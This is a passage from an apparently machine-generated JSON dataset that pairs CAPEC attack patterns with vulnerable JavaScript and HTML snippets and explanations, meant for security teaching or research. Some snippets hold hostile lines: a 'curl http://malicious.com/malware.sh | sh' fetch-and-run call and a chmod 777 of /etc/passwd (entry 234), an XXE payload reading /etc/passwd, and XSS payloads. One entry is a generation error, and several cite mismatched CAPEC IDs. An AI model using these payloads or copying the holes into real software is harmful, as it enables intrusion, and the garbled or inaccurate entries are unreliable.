        "code_snippet": "function calculateTotalPrice(pricePerItem, quantity) {\n  // Client-side calculation of total price\n  return pricePerItem * quantity;\n}\n\n// Example usage\nlet pricePerItem = 100;\nlet quantity = 5;\nlet totalPrice = calculateTotalPrice(pricePerItem, quantity);\n\n// Attacker modifies the quantity to avoid correct billing\nquantity = 1;\ntotalPrice = calculateTotalPrice(pricePerItem, quantity);\n\nconsole.log('Total Price:', totalPrice); // Outputs: Total Price: 100",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-side calculation of the total price for a purchase. The function `calculateTotalPrice` takes the price per item and the quantity as inputs and returns the total price. In a legitimate scenario, the server would rely on the client to correctly compute the total cost. However, an attacker can manipulate the quantity value on the client-side to reduce the total price, as shown in the example where the quantity is changed from 5 to 1. This results in an incorrect total price being sent to the server, allowing the attacker to make purchases at a fraction of the legitimate cost. This code embodies the main idea of the CAPEC by illustrating how client-side logic can be tampered with, leading to incorrect billing. The related CWEs highlight the issues of relying on client-side enforcement, incorrect calculations, and improper validation of input quantities."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <h1>Welcome to the Test Page</h1>\n    <script>\n        // This script is intended to be served with a non-script MIME type, e.g., text/plain\n        alert('This is a script running due to MIME type mismatch vulnerability!');\n        document.cookie = 'sessionId=12345'; // Simulate cookie theft\n    </script>\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a Cross-Site Scripting (XSS) attack using MIME type mismatch. The script tag contains JavaScript code that is intended to be served with a MIME type that does not typically execute scripts, such as 'text/plain'. Some browsers may detect the mismatch between the MIME type and the actual content, and switch to interpreting the content as JavaScript without applying script filters. This can lead to the execution of arbitrary scripts, potentially allowing an attacker to steal cookies or perform other malicious actions. The code also highlights related weaknesses such as improper input validation (CWE-20), reliance on file name or extension (CWE-646), and improper neutralization of script in attributes (CWE-82) or encoded URI schemes (CWE-84)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "document.getElementById('userInput').innerHTML = '<img src=x onerror=alert(1)>';",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CWE-79 (Cross-site Scripting) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags). The code takes user input and directly inserts it into the HTML of a web page without proper sanitization. Specifically, it sets the innerHTML of an element with the ID 'userInput' to an IMG tag with an 'onerror' attribute that triggers a JavaScript alert. This represents a common XSS attack vector where an attacker can inject malicious scripts into a web page, exploiting the lack of input neutralization. The code snippet embodies the deprecated CAPEC idea of leveraging web tools to change application behavior by demonstrating how an attacker could manipulate the DOM to execute arbitrary scripts."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "const fs = require('fs');\n\n// Function to read a file and return its contents\nfunction readFile(filePath) {\n  return fs.readFileSync(filePath, 'utf8');\n}\n\n// Function to log sensitive system information\nfunction logSystemInfo() {\n  const sensitiveInfo = readFile('/etc/passwd'); // Sensitive file\n  console.log(sensitiveInfo);\n}\n\n// Function to handle user input and misuse functionality\nfunction handleUserInput(input) {\n  if (input === 'logInfo') {\n    logSystemInfo(); // Misuse of legitimate functionality\n  } else {\n    console.log('Invalid input');\n  }\n}\n\n// Simulate user input\nhandleUserInput('logInfo');",
        "description": "This JavaScript code snippet demonstrates a misuse of legitimate functionality, aligning with the CAPEC description of 'Functionality Misuse'. The `readFile` function reads the contents of a file, and the `logSystemInfo` function logs sensitive system information from the '/etc/passwd' file. The `handleUserInput` function takes user input and, if the input is 'logInfo', it calls `logSystemInfo`, thereby exposing sensitive system information. This misuse of functionality can lead to unauthorized access to sensitive data, embodying CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code also represents CWE-1242 (Inclusion of Undocumented Features or Chicken Bits) by providing a hidden feature that can be triggered by specific input."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'public');\n  let filePath = path.join(basePath, req.url);\n\n  // Vulnerable to path traversal\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. However, the code is vulnerable to path traversal attacks because it directly concatenates the user-provided URL to the base directory path without proper validation or sanitization. An attacker can exploit this vulnerability by including sequences like '/../' or '....' in the URL to access files outside the intended directory, potentially leading to unauthorized access to sensitive files on the server."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate a potential error\n    if (req.url === '/error') {\n      throw new Error('Simulated error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, world!');\n  } catch (err) {\n    // Exposing stack trace in the response\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}\\nStack Trace: ${err.stack}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server listens for incoming requests and simulates an error when the URL path is '/error'. When an error occurs, the server catches the exception and responds with a 500 status code, including the error message and stack trace in the response. This behavior exposes sensitive information about the server's internal workings, which can be exploited by attackers for application mapping. The code demonstrates the vulnerability described in the deprecated CAPEC entry, highlighting the risk of exposing stack traces and sensitive information in error responses. This is related to CWE-7 (J2EE Misconfiguration: Missing Custom Error Page) as it shows the importance of handling errors properly without revealing internal details."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate processing of request\n    if (Math.random() < 0.5) {\n      throw new Error('Random error occurred');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Request processed successfully');\n  } catch (err) {\n    // Log error with sensitive information\n    console.error(`Error: ${err.message}, Stack: ${err.stack}`);\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Internal Server Error: ${err.message}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server processes incoming requests and randomly throws an error to simulate unexpected conditions. When an error occurs, it logs the error message and stack trace, which may contain sensitive information, to the console. Additionally, it sends the error message back to the client in the HTTP response. This embodies the main idea of the CAPEC by demonstrating how an application can expose sensitive information through error messages and logs, which can be exploited by an attacker using fuzzing techniques to map the application and gather valuable information."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Missing authentication for critical function (CWE-306)\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});\n\n// Improper enforcement of message integrity (CWE-924)\nserver.on('request', (req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    // No integrity check on the received message\n    console.log('Received message:', body);\n  });\n});\n\n// Improper verification of source (CWE-940)\nserver.on('connection', (socket) => {\n  console.log('New connection from:', socket.remoteAddress);\n  // No verification of the source of the connection\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It demonstrates several vulnerabilities related to communication channel manipulation. The server has a critical function accessible at '/admin' without any authentication (CWE-306). It also logs incoming messages without verifying their integrity (CWE-924) and accepts connections without verifying their source (CWE-940). These vulnerabilities can be exploited by an adversary to manipulate the communication channel, potentially leading to information exposure, unauthorized access, and system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/data',\n  method: 'GET',\n  rejectUnauthorized: false // CWE-294: Improper verification of SSL/TLS certificates\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Received data:', data); // CWE-201: Insertion of sensitive information into sent data\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates an HTTPS request to a server with an incorrectly configured SSL/TLS setup. The 'rejectUnauthorized' option is set to false, which means the client does not verify the server's SSL/TLS certificate (CWE-294). This can allow an adversary to perform a man-in-the-middle attack. Additionally, the code logs the received data, which may include sensitive information (CWE-201). This snippet embodies the main idea of CAPEC-Exploiting Incorrectly Configured SSL/TLS by showing how improper SSL/TLS configuration can lead to vulnerabilities."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "const xml2js = require('xml2js');\nconst axios = require('axios');\n\nasync function sendRequest(xmlMessage) {\n  try {\n    // Missing XML Validation (CWE-112)\n    const parser = new xml2js.Parser();\n    const parsedMessage = await parser.parseStringPromise(xmlMessage);\n\n    // Insufficient Verification of Data Authenticity (CWE-345)\n    if (!parsedMessage || !parsedMessage.header || !parsedMessage.header.authToken) {\n      throw new Error('Invalid message format or missing authentication token');\n    }\n\n    // Incorrectly Specified Destination in a Communication Channel (CWE-941)\n    const destinationUrl = parsedMessage.header.destinationUrl[0];\n    if (!destinationUrl) {\n      throw new Error('Destination URL is missing');\n    }\n\n    // Improper Enforcement of Message Integrity During Transmission (CWE-924)\n    const originalHash = parsedMessage.header.messageHash[0];\n    const computedHash = computeHash(xmlMessage);\n    if (originalHash !== computedHash) {\n      throw new Error('Message integrity check failed');\n    }\n\n    // Channel Accessible by Non-Endpoint (CWE-300)\n    const response = await axios.post(destinationUrl, xmlMessage, {\n      headers: { 'Content-Type': 'application/xml' }\n    });\n\n    console.log('Response:', response.data);\n  } catch (error) {\n    console.error('Error:', error.message);\n  }\n}\n\nfunction computeHash(message) {\n  // Simple hash function for demonstration purposes\n  return require('crypto').createHash('sha256').update(message).digest('hex');\n}\n\n// Example usage\nconst exampleXmlMessage = `\n<message>\n  <header>\n    <authToken>12345</authToken>\n    <destinationUrl>http://example.com/api</destinationUrl>\n    <messageHash>abcdef1234567890</messageHash>\n  </header>\n  <body>\n    <data>Some important data</data>\n  </body>\n</message>`;\n\nsendRequest(exampleXmlMessage);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could spoof UDDI/ebXML messages to impersonate a service provider in an e-business transaction. The code lacks proper XML validation (CWE-112), insufficiently verifies the authenticity of the data (CWE-345), and does not correctly specify the destination in the communication channel (CWE-941). Additionally, it does not enforce message integrity during transmission (CWE-924) and allows the communication channel to be accessed by non-endpoints (CWE-300). The function `sendRequest` processes an XML message, but due to the mentioned weaknesses, it is vulnerable to spoofing attacks."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n\n      // CWE-112: Missing XML Validation\n      // No schema validation is performed here\n\n      // CWE-611: Improper Restriction of XML External Entity Reference\n      // External entities are not disabled\n\n      // CWE-441: Unintended Proxy or Intermediary\n      // Forwarding the request without preserving the original source\n      const options = {\n        hostname: 'external-service.com',\n        port: 80,\n        path: '/process',\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/xml'\n        }\n      };\n\n      const forwardReq = http.request(options, forwardRes => {\n        let forwardData = '';\n        forwardRes.on('data', chunk => {\n          forwardData += chunk;\n        });\n        forwardRes.on('end', () => {\n          res.writeHead(200, {'Content-Type': 'application/xml'});\n          res.end(forwardData);\n        });\n      });\n\n      forwardReq.write(body);\n      forwardReq.end();\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming XML requests and forwards them to an external service. The code demonstrates several vulnerabilities related to XML Routing Detour Attacks (CAPEC-94) and associated CWEs:\n\n1. **CWE-112: Missing XML Validation** - The XML input is parsed without validating it against a schema, allowing potentially malicious XML to be processed.\n2. **CWE-611: Improper Restriction of XML External Entity Reference** - The XML parser does not disable external entities, which could lead to XML External Entity (XXE) attacks.\n3. **CWE-441: Unintended Proxy or Intermediary** - The server forwards the XML request to an external service without preserving the original source, making it act as an unintended proxy.\n\nThe code captures the essence of an XML Routing Detour Attack by showing how an attacker could exploit these weaknesses to reroute and manipulate XML processing through a compromised intermediary."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  // Weak algorithm selection during negotiation\n  client.write('ALGO:WEAK');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Capture-replay vulnerability\n  if (data.toString() === 'AUTH:SUCCESS') {\n    client.write('REPLAY:AUTH:SUCCESS');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a client-server communication scenario that embodies the main idea of CAPEC-272: Client-Server Protocol Manipulation. The code uses the 'net' module to create a TCP client that connects to a server. It includes vulnerabilities related to the CWEs mentioned:\n\n1. **Selection of Less-Secure Algorithm During Negotiation (CWE-757)**: The client sends a message 'ALGO:WEAK' to the server, indicating the use of a weak algorithm for communication.\n\n2. **Authentication Bypass by Capture-replay (CWE-294)**: The client listens for an 'AUTH:SUCCESS' message from the server and then replays this message back to the server, demonstrating a capture-replay attack.\n\nThis code snippet highlights how an adversary can manipulate the client-server protocol to perform unexpected actions, such as selecting weak algorithms and bypassing authentication mechanisms."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(express.text());\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser({\n    explicitEntity: true\n  });\n\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n\n    // Process the parsed XML\n    fs.writeFile('output.txt', JSON.stringify(result), (err) => {\n      if (err) {\n        res.status(500).send('Server Error');\n        return;\n      }\n      res.send('File processed successfully');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library with explicit entity processing enabled. This setup is vulnerable to XML External Entity (XXE) attacks, where an attacker can craft an XML payload that references external entities, potentially leading to resource exhaustion or other malicious actions. The code also demonstrates improper handling of file writes, which can lead to issues if the data is unserializable or if the file name is manipulated. This snippet embodies the main idea of the CAPEC by showing how improper handling of XML entities and file operations can lead to security vulnerabilities."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "<html>\n<head>\n  <title>Vulnerable Page</title>\n</head>\n<body>\n  <iframe src=\"https://trusted-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5; z-index:2;\"></iframe>\n  <div style=\"position:absolute; top:0; left:0; width:100%; height:100%; z-index:1;\">\n    <button onclick=\"alert('You clicked the button!')\">Click Me!</button>\n  </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates an iFrame overlay attack. The main idea is to trick the user into interacting with a seemingly legitimate UI element (a button) while an invisible iFrame from a trusted site overlays the entire page. The iFrame is set with a higher z-index and partial opacity, making it difficult for the user to realize they are interacting with a different context. This can lead to actions being unknowingly performed on the trusted site. The code also highlights CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iFrame, CWE-451 (UI Misrepresentation of Critical Information) by obscuring the true source of the interaction, and CWE-79 (Cross-site Scripting) by potentially allowing malicious scripts within the iFrame."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const os = require('os');\n  const sensitiveInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    release: os.release(),\n    uptime: os.uptime()\n  };\n\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify(sensitiveInfo));\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When accessed, it gathers sensitive system information such as the hostname, platform, OS release, and uptime using the 'os' module. This information is then sent back to the client in JSON format. The code demonstrates the concept of fingerprinting by exposing sensitive system details that can be used by an adversary to identify the operating system and other specifics of the target system. This exposure aligns with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/dashboard', (req, res) => {\n  const sessionCookie = req.cookies['session_id'];\n  if (sessionCookie) {\n    // Assume the session ID is valid without validation\n    res.send('Welcome to your dashboard!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that relies on cookies for session management. The '/dashboard' route checks for the presence of a 'session_id' cookie and grants access to the dashboard if the cookie exists, without validating the session ID. This embodies the main idea of CAPEC-139: 'Session Credential Falsification through Manipulation'. The code is vulnerable to CWE-565 (Reliance on Cookies without Validation and Integrity Checking) because it does not verify the validity of the session ID. It also touches on CWE-472 (External Control of Assumed-Immutable Web Parameter) as the session ID is assumed to be immutable but can be manipulated by an attacker. Additionally, it is susceptible to CWE-384 (Session Fixation) and CWE-613 (Insufficient Session Expiration) as it does not handle session expiration or invalidation properly."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource',\n  method: 'GET'\n};\n\nfunction makeRequest() {\n  const req = http.request(options, res => {\n    res.on('data', chunk => {\n      // Simulate processing time\n      setTimeout(() => {\n        makeRequest();\n      }, 1000);\n    });\n  });\n\n  req.on('error', error => {\n    console.error(error);\n  });\n\n  req.end();\n}\n\n// Start the attack\nmakeRequest();",
        "description": "This JavaScript code snippet demonstrates a sustained client engagement attack. The code repeatedly makes HTTP GET requests to a target server's resource. Each response is processed with a delay, simulating legitimate processing time, and then another request is made. This keeps the server's resource engaged continuously, potentially denying access to legitimate users. The code embodies the CAPEC concept by tying up the server's resources without crashing or flooding it, leveraging CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xmlData = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed XML:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability using the xml2js library to parse an XML document. The XML data includes a malicious DTD that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive system files. This example embodies the main idea of CAPEC-112 (DTD Injection) and highlights related weaknesses such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition). The code showcases how an attacker can inject malicious content into an application's DTD to cause resource depletion or expose sensitive information."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst yaml = require('js-yaml');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/x-yaml' }));\n\napp.post('/upload', (req, res) => {\n  try {\n    const data = yaml.load(req.body);\n    // Process the data (vulnerable to resource exhaustion)\n    res.send('Data processed successfully');\n  } catch (e) {\n    res.status(400).send('Invalid YAML');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts YAML data via a POST request. The server uses the 'js-yaml' library to parse the incoming YAML data. The main vulnerability here is that the server does not impose any limits on the size or complexity of the YAML data being parsed. An attacker can exploit this by sending a specially crafted YAML file with a large number of nested elements or deeply nested structures, causing the parser to consume excessive CPU resources and potentially leading to a denial of service (DoS) condition. This embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' and relates to CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-611 (Improper Restriction of XML External Entity Reference) by demonstrating how improper handling of serialized data can lead to resource exhaustion."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Failed to parse CodeSnippet from completion {}. Got: 2 validation errors for CodeSnippet\ncode_snippet\n  field required (type=value_error.missing)\ndescription\n  field required (type=value_error.missing)"
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n    // CWE-770: No limit on the size of the data being received\n  });\n\n  req.on('end', () => {\n    // CWE-112: No XML validation against a schema\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // CWE-674: Uncontrolled recursion in XML parsing\n      processXML(result);\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('XML processed');\n    });\n  });\n});\n\nfunction processXML(xml) {\n  // Simulate processing of XML data\n  if (xml && typeof xml === 'object') {\n    for (let key in xml) {\n      processXML(xml[key]);\n    }\n  }\n}\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that receives XML data from clients. The server reads the incoming data without imposing any size limits (CWE-770), which can lead to resource exhaustion. The XML data is then parsed without validation against a schema (CWE-112), making it vulnerable to maliciously crafted XML. The `processXML` function demonstrates uncontrolled recursion (CWE-674), which can lead to stack overflow or excessive resource consumption. This code embodies the main idea of CAPEC-228, where an adversary can inject oversized serialized data payloads to exhaust system resources or execute arbitrary code."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "const userRole = 'user';\n\nfunction performAdminTask() {\n  if (userRole !== 'admin') {\n    console.log('Access denied: insufficient privileges');\n    return;\n  }\n  // Admin task logic here\n  console.log('Admin task performed');\n}\n\nfunction elevatePrivileges() {\n  userRole = 'admin'; // CWE-269: Improper Privilege Management\n  console.log('Privileges elevated to admin');\n}\n\nelevatePrivileges(); // CWE-274: Improper Handling of Insufficient Privileges\nperformAdminTask();",
        "description": "This JavaScript code snippet demonstrates a privilege escalation vulnerability. The `userRole` is initially set to 'user', and the `performAdminTask` function checks if the `userRole` is 'admin' before performing an admin task. However, the `elevatePrivileges` function improperly changes the `userRole` to 'admin' without proper authorization checks (CWE-269: Improper Privilege Management). This allows a user with insufficient privileges to elevate their role and perform admin tasks (CWE-274: Improper Handling of Insufficient Privileges). The code highlights the main idea of privilege escalation by showing how improper privilege management can lead to unauthorized actions."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('/etc/passwd', '777');\n\n// CWE-250: Execution with Unnecessary Privileges\nexec('sudo somePrivilegedCommand', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// CWE-271: Privilege Dropping / Lowering Errors\nprocess.setuid(1000); // Drop privileges to a non-privileged user\n\n// CWE-114: Process Control\nexec('curl http://malicious.com/malware.sh | sh', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that could lead to hijacking a privileged process. The code first changes the permissions of a critical system file (`/etc/passwd`) to be world-writable (CWE-732). It then executes a command with unnecessary privileges (CWE-250). After that, it attempts to drop privileges but does so incorrectly (CWE-271). Finally, it executes a command from an untrusted source, which could lead to executing malicious code (CWE-114). This combination of vulnerabilities can allow an attacker to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Vulnerable to replay attack\n    if (data.toString() === 'AUTH_TOKEN') {\n      socket.write('Authenticated');\n    } else {\n      socket.write('Authentication Failed');\n    }\n  });\n});\nserver.listen(1337, '127.0.0.1');\n\n// Shared non-final static variable in multi-threaded context\nlet sharedResource = 0;\nfunction unsafeFunction() {\n  sharedResource++;\n  console.log(sharedResource);\n}\n\n// Simulate multi-threaded access\nsetInterval(unsafeFunction, 1000);",
        "description": "This JavaScript code snippet demonstrates a server that is vulnerable to a capture-replay attack (CWE-294) and unsafe handling of shared resources in a multi-threaded context (CWE-1058). The server listens for incoming connections and checks if the received data matches a hardcoded 'AUTH_TOKEN'. If it does, it sends an 'Authenticated' message back to the client. This simplistic authentication mechanism is vulnerable to replay attacks, as an attacker can capture the 'AUTH_TOKEN' and replay it to gain unauthorized access. Additionally, the code includes a shared non-final static variable 'sharedResource' that is incremented by a function 'unsafeFunction' running in a simulated multi-threaded environment using 'setInterval'. This can lead to race conditions and improper synchronization issues, as multiple threads can access and modify 'sharedResource' concurrently without proper synchronization mechanisms."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const fs = require('fs');\n\nprocess.on('SIGINT', () => {\n  console.log('Caught interrupt signal');\n  fs.writeFileSync('/tmp/privileged_file', 'data');\n  process.exit();\n});\n\nfunction privilegedOperation() {\n  try {\n    // Simulate privileged operation\n    console.log('Performing privileged operation');\n    throw new Error('Simulated error');\n  } catch (e) {\n    console.log('Error caught: ' + e.message);\n  }\n}\n\nprivilegedOperation();",
        "description": "This JavaScript code snippet demonstrates a signal handler that performs a file write operation, which is not asynchronous-safe (CWE-828). The signal handler catches the SIGINT signal and writes to a file, which can be interrupted, leading to potential race conditions or inconsistent states. Additionally, the privilegedOperation function simulates a privileged operation that throws an error, which is caught and logged (CWE-391). This setup can be exploited by an attacker to hijack the privileged thread of execution (CAPEC-30) by sending a SIGINT signal at a critical moment, potentially bypassing security controls or causing unintended behavior."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeUntrustedCode(code) {\n  try {\n    // Simulate sandboxed environment\n    const sandbox = new Function(code);\n    sandbox();\n  } catch (e) {\n    console.error('Sandbox error:', e);\n  }\n}\n\n// Untrusted JavaScript code that calls native code\nconst untrustedCode = `\n  const { execSync } = require('child_process');\n  execSync('ls'); // Unsafe operation\n`;\n\nexecuteUntrustedCode(untrustedCode);",
        "description": "This JavaScript code snippet demonstrates a sandbox escape vulnerability. The `executeUntrustedCode` function simulates a sandboxed environment by using the `Function` constructor to execute untrusted code. The untrusted code, however, uses Node.js's `child_process` module to execute a shell command (`ls`), which is an unsafe operation. This represents the CAPEC scenario where an attacker submits malicious code in another language (JavaScript in this case) to escape the sandbox and perform operations that were not intended to be allowed. The related CWEs are illustrated by the use of unsafe native code execution (CWE-111) and the potential exposure of sensitive information through error messages (CWE-537)."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
